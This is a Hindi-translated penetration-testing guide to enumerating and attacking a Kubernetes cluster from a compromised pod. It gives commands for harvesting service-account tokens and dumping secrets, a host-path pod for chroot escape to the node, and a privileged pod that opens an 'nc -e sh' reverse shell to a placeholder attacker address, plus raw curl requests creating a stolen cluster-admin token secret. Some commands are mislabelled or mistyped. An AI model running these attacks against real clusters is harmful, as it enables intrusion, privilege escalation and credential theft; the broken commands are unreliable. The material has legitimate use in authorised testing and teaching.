# Kubernetes Enumeration

{{#include ../../banners/hacktricks-training.md}}

## Kubernetes Tokens

यदि आपके पास किसी मशीन तक समझौता किया गया पहुंच है, तो उपयोगकर्ता के पास कुछ Kubernetes प्लेटफ़ॉर्म तक पहुंच हो सकती है। टोकन आमतौर पर **env var `KUBECONFIG`** द्वारा इंगित फ़ाइल में या **`~/.kube`** के अंदर स्थित होता है।

इस फ़ोल्डर में आप **API सर्वर से कनेक्ट करने के लिए टोकन और कॉन्फ़िगरेशन के साथ कॉन्फ़िग फ़ाइलें** पा सकते हैं। इस फ़ोल्डर में आपको पहले से प्राप्त जानकारी के साथ एक कैश फ़ोल्डर भी मिल सकता है।

यदि आपने Kubernetes वातावरण के अंदर एक पॉड से समझौता किया है, तो अन्य स्थान हैं जहाँ आप टोकन और वर्तमान K8 वातावरण के बारे में जानकारी पा सकते हैं:

### Service Account Tokens

जारी रखने से पहले, यदि आप नहीं जानते कि Kubernetes में सेवा क्या है, तो मैं आपको **इस लिंक का पालन करने और Kubernetes आर्किटेक्चर के बारे में कम से कम जानकारी पढ़ने** की सलाह दूंगा।

Kubernetes [दस्तावेज़ीकरण](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) से लिया गया:

_“जब आप एक पॉड बनाते हैं, यदि आप एक सेवा खाता निर्दिष्ट नहीं करते हैं, तो इसे स्वचालित रूप से उसी namespace में डिफ़ॉल्ट सेवा खाते को सौंपा जाता है।”_

**ServiceAccount** एक वस्तु है जिसे Kubernetes द्वारा प्रबंधित किया जाता है और यह पॉड में चलने वाली प्रक्रियाओं के लिए एक पहचान प्रदान करने के लिए उपयोग किया जाता है।\
हर सेवा खाते से संबंधित एक गुप्त होता है और इस गुप्त में एक बियरर टोकन होता है। यह एक JSON वेब टोकन (JWT) है, जो दो पक्षों के बीच दावों का सुरक्षित रूप से प्रतिनिधित्व करने का एक तरीका है।

आम तौर पर **एक** निर्देशिका:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccount`

इन फ़ाइलों को शामिल करती हैं:

- **ca.crt**: यह Kubernetes संचार की जांच के लिए ca प्रमाणपत्र है
- **namespace**: यह वर्तमान namespace को इंगित करता है
- **token**: इसमें वर्तमान पॉड का **सेवा टोकन** होता है।

अब जब आपके पास टोकन है, तो आप वातावरण चर **`KUBECONFIG`** के अंदर API सर्वर पा सकते हैं। अधिक जानकारी के लिए चलाएँ `(env | set) | grep -i "kuber|kube`**`"`**

सेवा खाता टोकन उस कुंजी द्वारा हस्ताक्षरित होता है जो फ़ाइल **sa.key** में स्थित होती है और **sa.pub** द्वारा मान्य होती है।

**Kubernetes** पर डिफ़ॉल्ट स्थान:

- /etc/kubernetes/pki

**Minikube** पर डिफ़ॉल्ट स्थान:

- /var/lib/localkube/certs

### Hot Pods

_**Hot pods**_ ऐसे पॉड होते हैं जिनमें एक विशेषाधिकार प्राप्त सेवा खाता टोकन होता है। एक विशेषाधिकार प्राप्त सेवा खाता टोकन वह टोकन है जिसमें विशेषाधिकार प्राप्त कार्य करने की अनुमति होती है जैसे कि गुप्त सूचीबद्ध करना, पॉड बनाना, आदि।

## RBAC

यदि आप नहीं जानते कि **RBAC** क्या है, तो **इस अनुभाग को पढ़ें**।

## GUI Applications

- **k9s**: एक GUI जो टर्मिनल से एक Kubernetes क्लस्टर को सूचीबद्ध करता है। [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/) में कमांड देखें। `:namespace` लिखें और सभी का चयन करें ताकि फिर सभी namespaces में संसाधनों की खोज की जा सके।
- **k8slens**: यह कुछ मुफ्त परीक्षण दिनों की पेशकश करता है: [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

K8s वातावरण को सूचीबद्ध करने के लिए आपको इनमें से कुछ की आवश्यकता है:

- एक **मान्य प्रमाणीकरण टोकन**। पिछले अनुभाग में हमने उपयोगकर्ता टोकन और सेवा खाता टोकन के लिए कहाँ खोजें, देखा।
- **Kubernetes API का **पता** (_**https://host:port**_**)। यह आमतौर पर वातावरण चर और/या kube कॉन्फ़िग फ़ाइल में पाया जा सकता है।
- **वैकल्पिक**: **API सर्वर को सत्यापित करने के लिए ca.crt**। यह उसी स्थानों पर पाया जा सकता है जहाँ टोकन पाया जा सकता है। यह API सर्वर प्रमाणपत्र को सत्यापित करने के लिए उपयोगी है, लेकिन `--insecure-skip-tls-verify` का उपयोग करते समय `kubectl` के साथ या `-k` का उपयोग करते समय `curl` के साथ आपको इसकी आवश्यकता नहीं होगी।

इन विवरणों के साथ आप **Kubernetes को सूचीबद्ध** कर सकते हैं। यदि **API** किसी कारण से **इंटरनेट** के माध्यम से **सुलभ** है, तो आप बस उस जानकारी को डाउनलोड कर सकते हैं और अपने होस्ट से प्लेटफ़ॉर्म को सूचीबद्ध कर सकते हैं।

हालांकि, आमतौर पर **API सर्वर एक आंतरिक नेटवर्क के अंदर होता है**, इसलिए आपको इसे अपनी मशीन से एक्सेस करने के लिए समझौता की गई मशीन के माध्यम से **एक सुरंग** बनाने की आवश्यकता होगी, या आप **`kubectl`** बाइनरी को **अपलोड** कर सकते हैं, या **`curl/wget/anything`** का उपयोग कर सकते हैं ताकि API सर्वर पर कच्चे HTTP अनुरोध किए जा सकें।

### Differences between `list` and `get` verbs

**`get`** अनुमतियों के साथ आप विशिष्ट संपत्तियों की जानकारी तक पहुँच सकते हैं (_`describe` विकल्प `kubectl` में_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
यदि आपके पास **`list`** अनुमति है, तो आप एक प्रकार के संपत्ति की सूची बनाने के लिए API अनुरोधों को निष्पादित करने की अनुमति रखते हैं (_`kubectl` में `get` विकल्प_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
यदि आपके पास **`watch`** अनुमति है, तो आपको संपत्तियों की निगरानी के लिए API अनुरोध निष्पादित करने की अनुमति है:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
वे एक स्ट्रीमिंग कनेक्शन खोलते हैं जो आपको एक Deployment का पूरा मैनिफेस्ट लौटाता है जब भी यह बदलता है (या जब एक नया बनाया जाता है)।

> [!CAUTION]
> निम्नलिखित `kubectl` कमांड केवल यह दर्शाते हैं कि वस्तुओं को कैसे सूचीबद्ध किया जाए। यदि आप डेटा तक पहुँच प्राप्त करना चाहते हैं तो आपको `get` के बजाय `describe` का उपयोग करना होगा।

### Using curl

एक पॉड के अंदर, आप कई env वेरिएबल्स का उपयोग कर सकते हैं:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
> [!WARNING]
> डिफ़ॉल्ट रूप से, पॉड **kube-api सर्वर** को डोमेन नाम **`kubernetes.default.svc`** में **एक्सेस** कर सकता है और आप **`/etc/resolv.config`** में kube नेटवर्क देख सकते हैं, क्योंकि यहाँ आपको kubernetes DNS सर्वर का पता मिलेगा (एक ही रेंज का ".1" kube-api एंडपॉइंट है)।

### Using kubectl

टोकन और API सर्वर का पता होने पर, आप इसे एक्सेस करने के लिए kubectl या curl का उपयोग करते हैं जैसा कि यहाँ संकेतित है:

डिफ़ॉल्ट रूप से, APISERVER `https://` स्कीमा के साथ संचार कर रहा है।
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
> यदि URL में `https://` नहीं है, तो आपको Bad Request जैसी त्रुटि मिल सकती है।

आप [**यहां आधिकारिक kubectl चीटशीट**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) पा सकते हैं। निम्नलिखित अनुभागों का लक्ष्य विभिन्न विकल्पों को क्रमबद्ध तरीके से प्रस्तुत करना है ताकि आप उस नए K8s को समझ सकें, जिसे आपने एक्सेस किया है।

यह जानने के लिए कि `kubectl` कौन-सी HTTP अनुरोध भेजता है, आप पैरामीटर `-v=8` का उपयोग कर सकते हैं।

#### MitM kubectl - kubectl को प्रॉक्सी करना
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### वर्तमान कॉन्फ़िगरेशन

{{#tabs }}
{{#tab name="Kubectl" }}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{{#endtab }}
{{#endtabs }}

यदि आप कुछ उपयोगकर्ताओं के क्रेडेंशियल चुराने में सफल हो गए हैं, तो आप उन्हें **स्थानीय रूप से कॉन्फ़िगर** कर सकते हैं, जैसे:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### समर्थित संसाधन प्राप्त करें

इस जानकारी के साथ, आप सभी सेवाओं को जानेंगे जिन्हें आप सूचीबद्ध कर सकते हैं

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{{#endtab }}
{{#endtabs }}

### वर्तमान विशेषाधिकार प्राप्त करें

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{{#endtab }}
{{#endtabs }}

अपने विशेषाधिकारों की जांच करने का एक और तरीका है उपकरण का उपयोग करना: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

आप **Kubernetes RBAC** के बारे में अधिक जान सकते हैं:

{{#ref}}
kubernetes-role-based-access-control-rbac.md
{{#endref}}

**एक बार जब आप जान लें कि आपके पास कौन से विशेषाधिकार हैं** तो निम्नलिखित पृष्ठ की जांच करें यह पता लगाने के लिए कि **क्या आप उनका दुरुपयोग कर सकते हैं** विशेषाधिकार बढ़ाने के लिए:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### दूसरों की भूमिकाएँ प्राप्त करें

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get roles
k get clusterroles
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{{#endtab }}
{{#endtabs }}

### नामस्थान प्राप्त करें

Kubernetes **एक ही भौतिक क्लस्टर** द्वारा समर्थित **कई आभासी क्लस्टर** का समर्थन करता है। इन आभासी क्लस्टरों को **नामस्थान** कहा जाता है।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get namespaces
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{{#endtab }}
{{#endtabs }}

### रहस्य प्राप्त करें

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{{#endtab }}
{{#endtabs }}

यदि आप रहस्यों को पढ़ सकते हैं, तो आप प्रत्येक टोकन से संबंधित विशेषाधिकार प्राप्त करने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### सेवा खातों को प्राप्त करें

जैसा कि इस पृष्ठ की शुरुआत में चर्चा की गई थी **जब एक पॉड चलाया जाता है, तो आमतौर पर एक सेवा खाता उसे सौंपा जाता है**। इसलिए, सेवा खातों की सूची बनाना, उनकी अनुमतियाँ और वे कहाँ चल रहे हैं, एक उपयोगकर्ता को विशेषाधिकार बढ़ाने की अनुमति दे सकता है।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get serviceaccounts
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{{#endtab }}
{{#endtabs }}

### डिप्लॉयमेंट प्राप्त करें

डिप्लॉयमेंट उन **घटक** को निर्दिष्ट करते हैं जिन्हें **चलाना** आवश्यक है।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get deployments
k get deployments -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{{#endtab }}
{{#endtabs }}

### Pods प्राप्त करें

Pods असली **कंटेनर** हैं जो **चलेंगे**।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get pods
k get pods -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{{#endtab }}
{{#endtabs }}

### सेवाएँ प्राप्त करें

Kubernetes **सेवाएँ** का उपयोग **एक विशिष्ट पोर्ट और IP में एक सेवा को उजागर करने के लिए** किया जाता है (जो वास्तव में सेवा प्रदान करने वाले पॉड्स के लिए लोड बैलेंसर के रूप में कार्य करेगा)। यह जानना दिलचस्प है कि आप अन्य सेवाएँ कहाँ पा सकते हैं जिन पर आप हमला करने की कोशिश कर सकते हैं।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get services
k get services -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{{#endtab }}
{{#endtabs }}

### नोड्स प्राप्त करें

क्लस्टर के अंदर **कॉन्फ़िगर किए गए सभी नोड्स** प्राप्त करें।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get nodes
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{{#endtab }}
{{#endtabs }}

### DaemonSets प्राप्त करें

**DaeamonSets** यह सुनिश्चित करने की अनुमति देता है कि **एक विशिष्ट पोड क्लस्टर के सभी नोड्स में चल रहा है** (या चयनित नोड्स में)। यदि आप DaemonSet को हटाते हैं, तो इसके द्वारा प्रबंधित पोड भी हटा दिए जाएंगे।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get daemonsets
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{{#endtab }}
{{#endtabs }}

### क्रोनजॉब प्राप्त करें

क्रोन जॉब्स crontab जैसे सिंटैक्स का उपयोग करके एक पॉड के लॉन्च को शेड्यूल करने की अनुमति देते हैं जो कुछ क्रियाएँ करेगा।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get cronjobs
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{{#endtab }}
{{#endtabs }}

### configMap प्राप्त करें

configMap हमेशा बहुत सारी जानकारी और configfile शामिल करता है जो kubernetes में चलने वाले ऐप्स को प्रदान करता है। आमतौर पर, आप बहुत सारे पासवर्ड, रहस्य, टोकन पा सकते हैं जो अन्य आंतरिक/बाहरी सेवा से कनेक्ट करने और मान्य करने के लिए उपयोग किए जाते हैं।

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get configmaps # -n namespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{{#endtab }}
{{#endtabs }}

### नेटवर्क नीतियाँ प्राप्त करें / Cilium नेटवर्क नीतियाँ

{{#tabs }}
{{#tab name="पहला टैब" }}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{{#endtab }}
{{#endtabs }}

### सब कुछ प्राप्त करें / सभी

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all
```
{{#endtab }}
{{#endtabs }}

### **हेल्म द्वारा प्रबंधित सभी संसाधनों को प्राप्त करें**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{{#endtab }}
{{#endtabs }}

### **पॉड्स की खपत प्राप्त करें**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k top pod --all-namespaces
```
{{#endtab }}
{{#endtabs }}

## क्लस्टर के साथ kubectl का उपयोग किए बिना इंटरैक्ट करना

चूंकि Kubernetes नियंत्रण Plane एक REST-ful API को उजागर करता है, आप HTTP अनुरोधों को हाथ से तैयार कर सकते हैं और उन्हें अन्य उपकरणों, जैसे **curl** या **wget** के साथ भेज सकते हैं।

### पॉड से बाहर निकलना

यदि आप नए पॉड बनाने में सक्षम हैं, तो आप उनसे नोड में भागने में सक्षम हो सकते हैं। ऐसा करने के लिए, आपको एक yaml फ़ाइल का उपयोग करके एक नया पॉड बनाना होगा, बनाए गए पॉड पर स्विच करना होगा और फिर नोड के सिस्टम में chroot करना होगा। आप yaml फ़ाइल के लिए संदर्भ के रूप में पहले से मौजूद पॉड का उपयोग कर सकते हैं क्योंकि वे मौजूदा छवियों और पथों को प्रदर्शित करते हैं।
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> यदि आपको किसी विशेष नोड पर पॉड बनाना है, तो आप नोड पर लेबल प्राप्त करने के लिए निम्नलिखित कमांड का उपयोग कर सकते हैं
>
> `k get nodes --show-labels`
>
> सामान्यतः, kubernetes.io/hostname और node-role.kubernetes.io/master सभी अच्छे लेबल हैं चयन के लिए।

फिर आप अपना attack.yaml फ़ाइल बनाते हैं।
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
उसके बाद आप पॉड बनाते हैं
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
अब आप निम्नलिखित के अनुसार बनाए गए पॉड पर स्विच कर सकते हैं
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
और अंत में आप नोड के सिस्टम में chroot करते हैं
```bash
chroot /root /bin/bash
```
सूचना प्राप्त की गई: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

### एक विशेषाधिकार प्राप्त पॉड बनाना

संबंधित yaml फ़ाइल इस प्रकार है:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: everything-allowed-exec-pod
labels:
app: pentest
spec:
hostNetwork: true
hostPID: true
hostIPC: true
containers:
- name: everything-allowed-pod
image: alpine
securityContext:
privileged: true
volumeMounts:
- mountPath: /host
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "nc <ATTACKER_IP> <ATTACKER_PORT> -e sh" ]
#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
volumes:
- name: noderoot
hostPath:
path: /
```
पॉड को curl के साथ बनाएं:
```bash
CONTROL_PLANE_HOST=""
TOKEN=""

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 478' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"labels\":{\"app\":\"pentest\"},\"name\":\"everything-allowed-exec-pod\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"args\":[\"nc <ATTACKER_IP> <ATTACKER_PORT> -e sh\"],\"command\":[\"/bin/sh\",\"-c\",\"--\"],\"image\":\"alpine\",\"name\":\"everything-allowed-pod\",\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"noderoot\"}]}],\"hostIPC\":true,\"hostNetwork\":true,\"hostPID\":true,\"volumes\":[{\"hostPath\":{\"path\":\"/\"},\"name\":\"noderoot\"}]}}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### एक पॉड हटाएँ

curl के साथ एक पॉड हटाएँ:
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
POD_NAME="everything-allowed-exec-pod"

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/default/pods/$POD_NAME"
```
### एक सेवा खाता बनाएं
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"


curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Length: 109' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"ServiceAccount\",\"metadata\":{\"name\":\"secrets-manager-sa-2\",\"namespace\":\"default\"}}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/serviceaccounts?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### एक सेवा खाता हटाएँ
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
SA_NAME=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 35' -H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/serviceaccounts/$SA_NAME"
```
### एक भूमिका बनाएं
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"


curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'Accept: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 203' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"Role\",\"metadata\":{\"name\":\"secrets-manager-role\",\"namespace\":\"default\"},\"rules\":[{\"apiGroups\":[\"\"],\"resources\":[\"secrets\"],\"verbs\":[\"get\",\"create\"]}]}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### एक भूमिका हटाएँ
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
ROLE_NAME=""

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles/$ROLE_NAME"
```
### एक भूमिका बाइंडिंग बनाएं
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 816' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"RoleBinding\",\"metadata\":{\"name\":\"secrets-manager-role-binding\",\"namespace\":\"default\"},\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"Role\",\"name\":\"secrets-manager-role\"},\"subjects\":[{\"apiGroup\":\"\",\"kind\":\"ServiceAccount\",\"name\":\"secrets-manager-sa\",\"namespace\":\"default\"}]}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/$NAMESPACE/default/rolebindings?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### एक भूमिका बाइंडिंग हटाएँ
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
ROLE_BINDING_NAME=""

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/rolebindings/$ROLE_BINDING_NAME"
```
### एक सीक्रेट हटाएँ
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 219' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/$NAMESPACE/default/secrets?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### एक सीक्रेट हटाएं
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
SECRET_NAME=""

ccurl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'Accept: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/secrets/$SECRET_NAME"
```
## संदर्भ

{{#ref}}
